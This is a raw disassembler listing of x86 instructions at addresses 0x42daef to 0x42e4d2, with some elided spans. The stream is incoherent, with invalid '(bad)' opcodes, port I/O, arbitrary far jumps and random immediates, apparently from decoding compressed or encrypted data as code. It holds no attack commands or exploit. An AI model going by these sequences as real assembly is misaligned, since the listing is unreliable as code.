  42daef:	mov    edx,0xb5cd40bc
  42daf4:	imul   ecx,DWORD PTR [eax+0xe067ba4],0x60685b65
  42dafe:	xchg   DWORD PTR [edx-0x654fd080],ecx
  42db04:	je     0x42db40
  42db06:	xor    DWORD PTR ds:0x9550be77,esp
  42db0c:	pop    edx
  42db0d:	mov    BYTE PTR [edi+0x49],bl
	...
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db12
  42db81:	dec    eax
  42db82:	out    0xc8,al
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	cwde   
  42db8d:	inc    eax
  42db8e:	std    
  42db8f:	bound  ecx,QWORD PTR [eax-0x4ea1b8dd]
  42db95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db96:	add    ebx,DWORD PTR [eax-0x68]
  42db99:	and    dl,BYTE PTR [eax]
  42db9b:	push   esi
  42db9c:	mov    bl,0x85
  42db9e:	in     al,0x65
  42dba0:	outs   dx,DWORD PTR ds:[esi]
  42dba1:	jecxz  0x42db99
  42dba3:	push   eax
  42dba4:	mov    bl,0x6f
  42dba6:	add    BYTE PTR [edx],dh
  42dba8:	test   DWORD PTR [edx-0x35],esi
  42dbab:	nop
  42dbac:	inc    edi
  42dbad:	test   cl,bh
  42dbaf:	aaa    
  42dbb0:	nop
  42dbb1:	int    0xe0
  42dbb3:	shr    BYTE PTR [eax],cl
  42dbb5:	arpl   WORD PTR [edx],si
  42dbb7:	adc    DWORD PTR [eax+0x681c6b0d],ecx
  42dbbd:	xchg   BYTE PTR [eax+ecx*1],al
  42dbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbc1:	xchg   ebx,eax
  42dbc2:	sbb    eax,0x4fe10484
  42dbc7:	sbb    al,bh
  42dbc9:	pop    ebp
  42dbca:	stc    
  42dbcb:	sti    
  42dbcc:	ficom  DWORD PTR [esi]
  42dbce:	loopne 0x42dbb0
  42dbd0:	dec    edi
  42dbd1:	aad    0x4a
  42dbd3:	mov    DWORD PTR [edx+edi*8],esp
  42dbd6:	mov    ebp,0x385bc276
  42dbdb:	or     esi,DWORD PTR [edx+eax*8+0x3d69e4a1]
  42dbe2:	dec    esi
  42dbe3:	and    edi,DWORD PTR [ebx]
  42dbe5:	jno    0x42dbfa
  42dbe7:	xlat   BYTE PTR ds:[ebx]
  42dbe8:	jl     0x42dc0c
  42dbea:	sub    dh,BYTE PTR [esi]
  42dbec:	test   al,0xfd
  42dbee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbef:	xchg   ebx,eax
  42dbf0:	ds jmp 0x42dc06
  42dbf3:	idiv   BYTE PTR [ecx+0x7e]
  42dbf6:	in     al,dx
  42dbf7:	push   cs
  42dbf8:	popa   
  42dbf9:	in     eax,dx
  42dbfa:	outs   dx,DWORD PTR ds:[esi]
  42dbfb:	repz popf 
  42dbfd:	jb     0x42dc02
  42dbff:	test   BYTE PTR [ebp-0x7f],bl
  42dc02:	jmp    0x42dc36
  42dc04:	gs and bh,al
  42dc07:	ret    0xe14d
  42dc0a:	adc    eax,eax
  42dc0c:	clc    
  42dc0d:	pop    es
  42dc0e:	jns    0x42dbde
  42dc10:	test   dl,ch
  42dc12:	and    eax,0x717af9c
  42dc17:	xchg   edi,eax
  42dc18:	jmp    0xde0e:0xc6ccbd24
  42dc1f:	push   ebx
  42dc20:	xor    ebp,ebx
  42dc22:	xchg   ecx,eax
  42dc23:	mov    edi,0x8b1d1195
  42dc28:	dec    esp
  42dc29:	sub    eax,0x55f1895b
  42dc2e:	mov    al,0xae
  42dc30:	ss cmp al,0x83
  42dc33:	xor    ah,BYTE PTR ds:0xde5bbd4c
  42dc39:	xchg   esp,eax
  42dc3a:	or     eax,DWORD PTR [edx]
  42dc3c:	push   eax
  42dc3d:	dec    ebp
  42dc3e:	jg     0x42dc9b
  42dc40:	push   edx
  42dc41:	in     al,0x6e
  42dc43:	pusha  
  42dc44:	pop    eax
  42dc45:	adc    esi,DWORD PTR [edi-0x41823196]
  42dc4b:	lahf   
  42dc4c:	jge    0x42dc9c
  42dc4e:	fs mov ecx,0x76480704
  42dc54:	adc    eax,0x45a2da52
  42dc59:	jbe    0x42dc74
  42dc5b:	inc    ecx
  42dc5c:	data16 jne 0x42dc62
  42dc5f:	pop    ds
  42dc60:	retf   0x621c
  42dc63:	imul   ecx,DWORD PTR [ebx-0x41d00a5d],0xffffffc0
  42dc6a:	push   ebp
  42dc6b:	ror    esi,1
  42dc6d:	sti    
  42dc6e:	lock mov ah,BYTE PTR [ebp-0x32]
  42dc72:	outs   dx,DWORD PTR ds:[esi]
  42dc73:	test   DWORD PTR [eax+0x75],esi
  42dc76:	aas    
  42dc77:	cmp    bh,dh
  42dc79:	xchg   ebx,eax
  42dc7a:	dec    ebp
  42dc7b:	pop    ecx
  42dc7c:	lods   al,BYTE PTR ds:[esi]
  42dc7d:	stc    
  42dc7e:	push   ecx
  42dc7f:	push   es
  42dc80:	test   BYTE PTR [ecx-0x21bcf950],0x9c
  42dc87:	xchg   ebp,eax
  42dc88:	addr16 sbb al,0x5b
  42dc8b:	sbb    eax,0x8a286618
	...
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	loope  0x42dd5f
  42dd02:	cmp    eax,0x1ea2c7f
  42dd07:	add    BYTE PTR [ecx+eax*1],al
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	aam    0xe2
  42dd0e:	push   cs
  42dd0f:	cmp    eax,ecx
  42dd11:	mov    fs,WORD PTR [edx+0x4e6e6647]
  42dd17:	stos   BYTE PTR es:[edi],al
  42dd18:	imul   ebx,DWORD PTR [ebx-0xb5ccbff],0xffffffb9
  42dd1f:	hlt    
  42dd20:	sti    
  42dd21:	mov    esi,0x593896e3
  42dd26:	or     eax,DWORD PTR [ebx]
  42dd28:	call   0xa68ab9c9
  42dd2d:	and    DWORD PTR [ecx],eax
  42dd2f:	aad    0xd2
  42dd31:	lods   al,BYTE PTR ds:[esi]
  42dd32:	and    edi,DWORD PTR [eax+eiz*4-0x6b]
  42dd36:	sbb    edi,ebp
  42dd38:	and    DWORD PTR ds:0x5c413a3d,esi
  42dd3e:	lock cmp ecx,DWORD PTR [edi+0x4ff422fd]
  42dd45:	sub    edx,eax
  42dd47:	pop    ss
  42dd48:	sbb    cl,BYTE PTR [ebp-0x1f304d91]
  42dd4e:	out    0xbb,al
  42dd50:	xchg   ecx,eax
  42dd51:	inc    edi
  42dd52:	test   al,0xd4
  42dd54:	xchg   BYTE PTR [ebp+0x5a],ah
  42dd57:	vpcomuw xmm10,xmm3,XMMWORD PTR [ebp+0x3dbb12c8],0xb7
  42dd61:	add    ch,BYTE PTR [ebx-0x68f01284]
  42dd67:	lea    edx,[edx+esi*2+0xe]
  42dd6b:	mov    ds:0x846a7bda,al
  42dd70:	and    al,0xfe
  42dd72:	dec    esi
  42dd73:	jno    0x42ddb4
  42dd75:	or     cl,0x56
  42dd78:	inc    BYTE PTR [eax+0x78]
  42dd7b:	popf   
  42dd7c:	stos   DWORD PTR es:[edi],eax
  42dd7d:	(bad)  
  42dd7e:	pop    ss
  42dd7f:	mov    al,ds:0xc2f7001f
  42dd84:	dec    ecx
  42dd85:	test   eax,0x9297f9e2
  42dd8a:	repnz iret 
  42dd8c:	xor    eax,0xeec36bd9
  42dd91:	or     edx,DWORD PTR [ebp+0x6a8944e1]
  42dd97:	jbe    0x42dd57
  42dd99:	ret    
  42dd9a:	stos   DWORD PTR es:[edi],eax
  42dd9b:	pop    esi
  42dd9c:	jmp    0x2e2e:0x6ddfbdb0
  42dda3:	cdq    
  42dda4:	into   
  42dda5:	fisub  WORD PTR [esi+esi*2-0xeb8751b]
  42ddac:	cmp    DWORD PTR [edi],0x68
  42ddaf:	cmp    al,0x9b
  42ddb1:	xor    DWORD PTR [eax],esi
  42ddb3:	sbb    dh,BYTE PTR [ecx+0x47]
  42ddb6:	sbb    ecx,DWORD PTR cs:[esi]
  42ddb9:	ins    DWORD PTR es:[edi],dx
  42ddba:	mov    dl,0xd4
  42ddbc:	inc    edx
  42ddbd:	jne    0x42ddb4
  42ddbf:	sbb    al,0x98
  42ddc1:	fistp  DWORD PTR [ebx+0x3]
  42ddc4:	mov    gs,WORD PTR [esi-0x42]
  42ddc7:	imul   esi,DWORD PTR [ecx+0x7f],0x7f
  42ddcb:	xchg   ecx,eax
  42ddcc:	repz dec esp
  42ddce:	int3   
  42ddcf:	pusha  
  42ddd0:	inc    esi
  42ddd1:	xchg   ebx,eax
  42ddd2:	pop    edi
  42ddd3:	sahf   
  42ddd4:	addr16 fcmovne st,st(0)
  42ddd7:	sbb    ch,bl
  42ddd9:	ret    0xf42
  42dddc:	hlt    
  42dddd:	and    al,ah
  42dddf:	fld    TBYTE PTR [ecx+eiz*8+0x2c]
  42dde3:	sbb    BYTE PTR [edx+ebp*8+0x5f],ch
  42dde7:	les    ecx,FWORD PTR [esi+0x8]
  42ddea:	pushf  
  42ddeb:	jo     0x42dd9e
  42dded:	stos   BYTE PTR es:[edi],al
  42ddee:	mov    edi,0xed6588bd
  42ddf3:	sbb    bl,BYTE PTR [ebp+0x72559bcb]
  42ddf9:	es pop edx
  42ddfb:	sbb    esp,ebx
  42ddfd:	jge    0x42dd9a
  42ddff:	mov    esi,esp
  42de01:	mov    edi,0x40dae922
  42de06:	or     al,0xb9
  42de08:	mov    eax,?
  42de0a:	pop    edx
  42de0b:	mov    cs:0x8379b8,al
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	add    BYTE PTR [ecx-0x21],dl
  42de83:	leave  
  42de84:	xor    bl,ch
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	std    
  42de8d:	clc    
  42de8e:	jg     0x42dedf
  42de90:	pop    ebx
  42de91:	cmp    al,0x15
  42de93:	mov    edx,0x37b0b3f0
  42de98:	rcl    BYTE PTR [ecx-0x404b2438],0xa4
  42de9f:	dec    ecx
  42dea0:	ins    BYTE PTR es:[edi],dx
  42dea1:	pop    esi
  42dea2:	leave  
  42dea3:	xor    al,0xfa
  42dea5:	scas   al,BYTE PTR es:[edi]
  42dea6:	ss pop edx
  42dea8:	mov    al,ds:0xfc93b65
  42dead:	mov    edi,0x2c2370fd
  42deb2:	push   ebp
  42deb3:	add    BYTE PTR [edx],ch
  42deb5:	or     DWORD PTR [ecx],esp
  42deb7:	int    0xa1
  42deb9:	call   0x82b61255
  42debe:	fsub   st,st(5)
  42dec0:	cmc    
  42dec1:	push   ebp
  42dec2:	test   al,0xa4
  42dec4:	mov    DWORD PTR ds:0xf7bb4736,ebp
  42deca:	inc    esp
  42decb:	ja     0x42de51
  42decd:	lock xor eax,0x6b6cc71f
  42ded3:	pop    esp
  42ded4:	add    eax,0xf1399459
  42ded9:	and    BYTE PTR [eax-0x33b875cc],0x93
  42dee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dee1:	dec    ecx
  42dee2:	sub    esp,eax
  42dee4:	push   0xffffff8b
  42dee6:	jecxz  0x42de9d
  42dee8:	test   eax,0xded42bbb
  42deed:	xchg   ecx,eax
  42deee:	sub    eax,0x907b0865
  42def3:	add    BYTE PTR [edx+eiz*4],cl
  42def6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42def7:	cmp    bl,dl
  42def9:	call   0x6bee:0xe7988429
  42df00:	jmp    0x42defb
  42df02:	pop    esp
  42df03:	inc    edx
  42df04:	test   BYTE PTR [esi+0x5],dl
  42df07:	xor    eax,0xc3a0cbf2
  42df0c:	pop    ecx
  42df0d:	retf   
  42df0e:	(bad)  
  42df0f:	jmp    0x42df74
  42df11:	push   ss
  42df12:	int    0x66
  42df14:	cdq    
  42df15:	push   ebx
  42df16:	inc    edi
  42df17:	adc    eax,0xec4864ea
  42df1c:	loopne 0x42df72
  42df1e:	jl     0x42df12
  42df20:	mov    eax,DWORD PTR [ebp+esi*1+0x34]
  42df24:	ds inc ecx
  42df26:	adc    ch,ch
  42df28:	xor    BYTE PTR [ebx-0x6cb4ea57],cl
  42df2e:	xor    edx,DWORD PTR [edi]
  42df30:	loop   0x42df55
  42df32:	outs   dx,DWORD PTR ds:[esi]
  42df33:	pusha  
  42df34:	cmc    
  42df35:	cmp    al,dh
  42df37:	push   es
  42df38:	dec    edx
  42df39:	inc    esi
  42df3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df3b:	mov    bl,0x10
  42df3d:	pushf  
  42df3e:	outs   dx,DWORD PTR ds:[esi]
  42df3f:	in     al,dx
  42df40:	fidiv  DWORD PTR [ecx-0x51667bf3]
  42df46:	into   
  42df47:	popa   
  42df48:	ins    DWORD PTR es:[edi],dx
  42df49:	(bad)  
  42df4a:	enter  0xa986,0x6
  42df4e:	out    dx,al
  42df4f:	bound  edi,QWORD PTR [edi]
  42df51:	lahf   
  42df52:	mov    gs,WORD PTR [esp+ebp*4+0x74421cf3]
  42df59:	jno    0x42df9e
  42df5b:	dec    esi
  42df5c:	rcr    BYTE PTR [ebp-0x5c],1
  42df5f:	fwait
  42df60:	dec    edi
  42df61:	jbe    0x42df76
  42df63:	fdiv   st,st(1)
  42df65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df66:	xor    ebx,edi
  42df68:	retf   
  42df69:	jge    0x42df08
  42df6b:	sbb    al,0xfa
  42df6d:	mov    esi,0x8a36ece0
  42df72:	inc    eax
  42df73:	sub    DWORD PTR [edi-0x7215f7d6],eax
  42df79:	popa   
  42df7a:	ret    0x8201
  42df7d:	inc    ebx
  42df7e:	or     eax,0x7197fe11
  42df83:	ret    
  42df84:	mov    ch,0x1d
  42df86:	iret   
  42df87:	sbb    esp,DWORD PTR [esp+eiz*2+0x55]
  42df8b:	mov    bh,BYTE PTR [edx+0xdda6c0]
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x27]
  42e001:	pop    esp
  42e002:	iret   
  42e003:	cmp    dh,BYTE PTR [esp+ebp*8]
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	push   eax
  42e00d:	nop
  42e00e:	in     eax,dx
  42e00f:	gs xor al,0xc5
  42e012:	or     BYTE PTR [edx],dl
  42e014:	inc    ebx
  42e015:	shl    DWORD PTR ds:0xa5720beb,1
  42e01b:	pushf  
  42e01c:	fwait
  42e01d:	out    dx,al
  42e01e:	into   
  42e01f:	int3   
  42e020:	xor    DWORD PTR [edi+0x6bba755a],edi
  42e026:	addr16 pop edx
  42e028:	in     al,dx
  42e029:	aaa    
  42e02a:	test   eax,0x61a4e3e2
  42e02f:	xor    DWORD PTR [esi+0x34],edi
  42e032:	pop    ss
  42e033:	xchg   edx,eax
  42e034:	push   0xffffffe7
  42e036:	fidiv  DWORD PTR [edi+eax*2-0x26e9a7a3]
  42e03d:	es push 0x4fdbf726
  42e043:	dec    eax
  42e044:	pop    ebp
  42e045:	(bad)  
  42e046:	mov    edi,0x9e2906e7
  42e04b:	aaa    
  42e04c:	inc    ebx
  42e04d:	mov    esp,0xd8c7c9e7
  42e052:	cmp    DWORD PTR [edx-0x14],0x6ab02042
  42e059:	and    esi,ebx
  42e05b:	sbb    DWORD PTR [ebx],ecx
  42e05d:	cs addr16 jge 0x42e050
  42e061:	clc    
  42e062:	push   esi
  42e063:	lea    edi,[edx]
  42e065:	int    0x6a
  42e067:	pop    ds
  42e068:	push   es
  42e069:	pop    edx
  42e06a:	cmp    al,0xc7
  42e06c:	inc    eax
  42e06d:	cs xor eax,0x42faf505
  42e073:	xchg   edx,eax
  42e074:	cmp    eax,0x1ab9315f
  42e079:	push   cs
  42e07a:	icebp  
  42e07b:	retf   
  42e07c:	test   BYTE PTR [ebx+0x4f],bh
  42e07f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e080:	add    al,0x6c
  42e082:	mov    ebx,0xee9793d7
  42e087:	push   edx
  42e088:	jmp    0x374afa38
  42e08d:	scas   eax,DWORD PTR es:[edi]
  42e08e:	test   al,0x2d
  42e090:	pop    ss
  42e091:	jp     0x42e0a7
  42e093:	int    0x78
  42e095:	lods   eax,DWORD PTR ds:[esi]
  42e096:	push   es
  42e097:	daa    
  42e098:	jmp    0x42e110
  42e09a:	adc    ah,BYTE PTR [ebx-0x52]
  42e09d:	dec    edx
  42e09e:	mov    esi,0xa0810479
  42e0a3:	popa   
  42e0a4:	sbb    esp,DWORD PTR [ebp-0x58]
  42e0a7:	neg    edi
  42e0a9:	dec    esi
  42e0aa:	in     eax,0x9d
  42e0ac:	in     eax,dx
  42e0ad:	lea    ebp,[esi]
  42e0af:	inc    eax
  42e0b0:	iret   
  42e0b1:	push   ds
  42e0b2:	mov    BYTE PTR [ebx+0x72],0x89
  42e0b6:	addr16 push 0xffffffd3
  42e0b9:	dec    esp
  42e0ba:	mov    DWORD PTR [eax-0x6e],eax
  42e0bd:	cs mov esp,DWORD PTR es:[ebx]
  42e0c1:	or     bh,ch
  42e0c3:	xchg   esi,eax
  42e0c4:	dec    ebp
  42e0c5:	mov    edx,0xa823b456
  42e0ca:	mov    ecx,0x75df9e75
  42e0cf:	das    
  42e0d0:	cmp    dh,ah
  42e0d2:	into   
  42e0d3:	mov    esi,ebx
  42e0d5:	inc    esi
  42e0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0d7:	pop    eax
  42e0d8:	fsubr  DWORD PTR [edi+0x18]
  42e0db:	lock rcl DWORD PTR [ebx-0x9],1
  42e0df:	mov    ebp,0x619f556b
  42e0e4:	mov    esi,DWORD PTR [eax-0x37fcb71c]
  42e0ea:	jnp    0x42e145
  42e0ec:	cmp    ecx,edx
  42e0ee:	sbb    bh,dl
  42e0f0:	xchg   ecx,eax
  42e0f1:	adc    al,0x47
  42e0f3:	or     bl,bl
  42e0f5:	dec    edx
  42e0f6:	(bad)  
  42e0f7:	cld    
  42e0f8:	pop    esp
  42e0f9:	push   ebx
  42e0fa:	sub    BYTE PTR [eax],al
  42e0fc:	mov    edx,0x960b0558
  42e101:	jle    0x42e12d
  42e103:	xchg   ebp,eax
  42e104:	sbb    cl,al
  42e106:	bound  esp,QWORD PTR [ecx+eax*8]
  42e109:	sahf   
  42e10a:	inc    ebp
  42e10b:	jp     0x42e128
  42e10d:	add    DWORD PTR [ebp+0xeb],ebx
	...
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	imul   esi,DWORD PTR [edi-0x12c73dcc],0x1040001
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	adc    al,0xb3
  42e18e:	inc    ecx
  42e18f:	out    dx,eax
  42e190:	loop   0x42e14d
  42e192:	jbe    0x42e1cc
  42e194:	mov    esi,0x469d83bd
  42e199:	loopne 0x42e12b
  42e19b:	scas   al,BYTE PTR es:[edi]
  42e19c:	mov    edi,0x55c54a55
  42e1a1:	fimul  DWORD PTR [ebx-0x285c687e]
  42e1a7:	ins    DWORD PTR es:[edi],dx
  42e1a8:	adc    BYTE PTR [edx+0x24],bl
  42e1ab:	sub    bl,dh
  42e1ad:	in     eax,0x81
  42e1af:	iret   
  42e1b0:	sar    BYTE PTR [eax-0x467fc788],0x8f
  42e1b7:	sbb    ebp,DWORD PTR [eax-0x3fd0cebf]
  42e1bd:	mov    cl,0x66
  42e1bf:	or     ecx,DWORD PTR [edx-0x78e538ce]
  42e1c5:	call   0x7b8c:0xa1d2ae2a
  42e1cc:	jne    0x42e1c6
  42e1ce:	xchg   esi,eax
  42e1cf:	sar    BYTE PTR [esi+0x2bf42b46],0x2c
  42e1d6:	pop    edx
  42e1d7:	(bad)  
  42e1d9:	or     BYTE PTR [ecx+esi*2+0x6],ch
  42e1dd:	inc    esi
  42e1de:	add    ebx,DWORD PTR [esi+ecx*8+0x63f79f29]
  42e1e5:	dec    ebp
  42e1e6:	push   eax
  42e1e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1e8:	jl     0x42e1b9
  42e1ea:	ins    DWORD PTR es:[edi],dx
  42e1eb:	mov    DWORD PTR [edi],ecx
  42e1ed:	gs stos DWORD PTR es:[edi],eax
  42e1ef:	jne    0x42e181
  42e1f1:	jo     0x42e258
  42e1f3:	test   al,al
  42e1f5:	outs   dx,DWORD PTR ss:[esi]
  42e1f7:	cld    
  42e1f8:	sub    al,0xb9
  42e1fa:	aaa    
  42e1fb:	dec    esi
  42e1fc:	in     al,dx
  42e1fd:	retf   0x3e9d
  42e200:	xor    edx,DWORD PTR [edi+eax*4-0x6f6ba622]
  42e207:	push   0xffffffa3
  42e209:	hlt    
  42e20a:	outs   dx,DWORD PTR ds:[esi]
  42e20b:	push   cs
  42e20c:	xchg   BYTE PTR [edi],ch
  42e20e:	bswap  ebx
  42e210:	xchg   BYTE PTR ds:0x2e174e19,dl
  42e216:	(bad)  
  42e217:	cld    
  42e218:	ins    BYTE PTR es:[edi],dx
  42e219:	js     0x42e1d0
  42e21b:	inc    esi
  42e21c:	les    ecx,FWORD PTR ds:[eax+ebp*8+0x67]
  42e221:	mov    eax,0xc32b5a51
  42e226:	icebp  
  42e227:	sub    BYTE PTR [edi],ah
  42e229:	cwde   
  42e22a:	mov    edi,0x12203dbf
  42e22f:	mov    edi,0x63d052f5
  42e234:	mov    ecx,gs
  42e236:	repz int 0x18
  42e239:	xor    dl,BYTE PTR [edi+eax*8]
  42e23c:	outs   dx,BYTE PTR ds:[esi]
  42e23d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e23e:	fbstp  TBYTE PTR [ebx]
  42e240:	retf   0x7b78
  42e243:	xor    DWORD PTR [ebp+0x1ba3ab77],ebx
  42e249:	imul   BYTE PTR [ebx]
  42e24b:	(bad)  
  42e24c:	cmc    
  42e24d:	jmp    0x9c09:0xc08c0cdc
  42e254:	cld    
  42e255:	sub    DWORD PTR [ebx],esp
  42e257:	xor    DWORD PTR [edx+0xf],0x22a812a4
  42e25e:	and    eax,0xa22ce3bb
  42e263:	mov    edi,0x9d18f082
  42e268:	stos   BYTE PTR es:[edi],al
  42e269:	data16 loope 0x42e2af
  42e26c:	mov    ds:0xf03c62b9,eax
  42e271:	push   ebp
  42e272:	mov    edi,0x74756a84
  42e277:	push   es
  42e278:	(bad)  
  42e279:	mov    eax,0x292ebc84
  42e27e:	lock jp 0x42e2e8
  42e281:	sub    BYTE PTR [eax-0x2657eab],ah
  42e287:	add    al,0x8
  42e289:	dec    edx
  42e28a:	adc    al,0xdd
  42e28c:	cmp    BYTE PTR [ebx+edx*1+0x69],bl
	...
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xc199140
  42e301:	dec    ecx
  42e302:	addr16 popa 
  42e304:	cmp    al,0xee
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	std    
  42e30d:	jmp    0xea5a:0x82067ded
  42e314:	inc    ebp
  42e315:	cld    
  42e316:	(bad)  
  42e317:	mov    dh,0xdd
  42e319:	cmp    eax,0xe0bd68e4
  42e31e:	repz sti 
  42e320:	lea    ecx,[ebx-0x48]
  42e323:	sbb    al,0x40
  42e325:	loop   0x42e34a
  42e327:	xor    eax,0x5fd0e17a
  42e32c:	loopne 0x42e332
  42e32e:	scas   eax,DWORD PTR es:[edi]
  42e32f:	jp     0x42e36e
  42e331:	inc    esi
  42e332:	dec    ecx
  42e333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e334:	add    al,0xcd
  42e336:	(bad)  
  42e337:	fld    TBYTE PTR [ebp-0x137d230d]
  42e33d:	fmul   QWORD PTR [ebx]
  42e33f:	es push edi
  42e341:	jbe    0x42e308
  42e343:	data16 mov ds:0x6e4bd330,al
  42e349:	and    al,0xfe
  42e34b:	pop    edx
  42e34c:	mov    fs,WORD PTR [esi]
  42e34e:	mov    WORD PTR [edi+0x56],?
  42e351:	sahf   
  42e352:	xchg   ecx,eax
  42e353:	xchg   esi,eax
  42e354:	test   al,0x6
  42e356:	lds    bx,DWORD PTR [edi+0x6c]
  42e35a:	outs   dx,DWORD PTR ds:[esi]
  42e35b:	cs lock sub eax,0x3415d7b6
  42e362:	sub    ebp,DWORD PTR [edi+0x1]
  42e365:	jle    0x42e354
  42e367:	jo     0x42e392
  42e369:	xor    eax,ecx
  42e36b:	add    al,0xe2
  42e36d:	mov    edx,0x23537eea
  42e372:	(bad)  
  42e374:	pop    eax
  42e375:	pop    esp
  42e376:	sbb    dl,BYTE PTR [edi+0x6b]
  42e379:	mov    ebx,0x3922f216
  42e37e:	lods   al,BYTE PTR ds:[esi]
  42e37f:	outs   dx,DWORD PTR ds:[esi]
  42e380:	jle    0x42e370
  42e382:	std    
  42e383:	mov    WORD PTR [esi+0x71],?
  42e386:	sbb    bh,BYTE PTR [edx+edi*8+0x41787326]
  42e38d:	sub    eax,0x1ffe7e82
  42e392:	retf   
  42e393:	gs ss int3 
  42e396:	loopne 0x42e389
  42e398:	fisubr DWORD PTR [edi+0x29]
  42e39b:	xchg   esi,eax
  42e39c:	dec    edi
  42e39d:	add    ecx,DWORD PTR [ebx-0x41]
  42e3a0:	sbb    eax,0xe2b89f7
  42e3a5:	mul    DWORD PTR [edx-0x5e143a0d]
  42e3ab:	xor    BYTE PTR [edi-0x53],bh
  42e3ae:	jecxz  0x42e336
  42e3b0:	adc    BYTE PTR [eax],al
  42e3b2:	mov    ds,WORD PTR [ebx+0x1a]
  42e3b5:	daa    
  42e3b6:	lock mov ebx,0x97a0e727
  42e3bc:	cmp    DWORD PTR [ebx],esi
  42e3be:	sub    dl,al
  42e3c0:	int3   
  42e3c1:	inc    ecx
  42e3c2:	lock ins DWORD PTR es:[edi],dx
  42e3c4:	pop    ebp
  42e3c5:	jns    0x42e444
  42e3c7:	fistp  WORD PTR [ebp-0x80]
  42e3ca:	popf   
  42e3cb:	sbb    eax,0x828e187b
  42e3d0:	retf   
  42e3d1:	cli    
  42e3d2:	mov    ecx,0xceed9ec0
  42e3d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3d8:	pop    edi
  42e3d9:	ret    
  42e3da:	sub    eax,esi
  42e3dc:	xchg   DWORD PTR [edx+0x5d],edx
  42e3df:	fyl2x  
  42e3e1:	xchg   BYTE PTR [edi+0x4de88c6a],al
  42e3e7:	dec    ebp
  42e3e8:	sub    BYTE PTR [ebp+0x16a5af9],ch
  42e3ee:	push   0x8a659b98
  42e3f3:	xor    DWORD PTR [ebx-0x71601fe1],edx
  42e3f9:	pop    ebp
  42e3fa:	adc    ah,BYTE PTR [ecx]
  42e3fc:	arpl   bx,cx
  42e3fe:	push   ebp
  42e3ff:	inc    esp
  42e400:	sub    bh,BYTE PTR [ebp+esi*8+0x40]
  42e404:	push   ds
  42e405:	jg     0x42e3ba
  42e407:	and    bl,BYTE PTR [edx+0x28eb7da7]
  42e40d:	sub    bl,bh
  42e40f:	pop    ecx
	...
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	push   esp
  42e481:	adc    al,0xb3
  42e483:	xor    al,0x40
  42e485:	out    dx,eax
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    al,0x1
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e48d:	push   0x2e216ec2
  42e492:	dec    esi
  42e493:	push   ebp
  42e494:	in     al,0x3b
  42e496:	jmp    0x1a7d:0x4b5edba9
  42e49d:	rcl    DWORD PTR [esi+0x65],cl
  42e4a0:	inc    edx
  42e4a1:	stos   DWORD PTR es:[edi],eax
  42e4a2:	and    ah,bl
  42e4a4:	inc    esp
  42e4a5:	scas   eax,DWORD PTR es:[edi]
  42e4a6:	clc    
  42e4a7:	scas   al,BYTE PTR es:[edi]
  42e4a8:	lea    ebp,[ecx]
  42e4aa:	arpl   WORD PTR [eax+0x6d],bp
  42e4ad:	test   DWORD PTR [ebx],ebx
  42e4af:	rol    DWORD PTR [eax+0x2727434f],0x9c
  42e4b6:	dec    eax
  42e4b7:	add    DWORD PTR [ecx+0x776794fa],ecx
  42e4bd:	sub    ch,0x47
  42e4c0:	mov    esi,0x61c0aa71
  42e4c5:	push   ebx
  42e4c6:	add    eax,0x53dd6d9b
  42e4cb:	push   0xf0694237
  42e4d0:	xor    al,0xd1
  42e4d2:	mov    DWORD PTR [esi+0x420abe85],0x6a01aff8
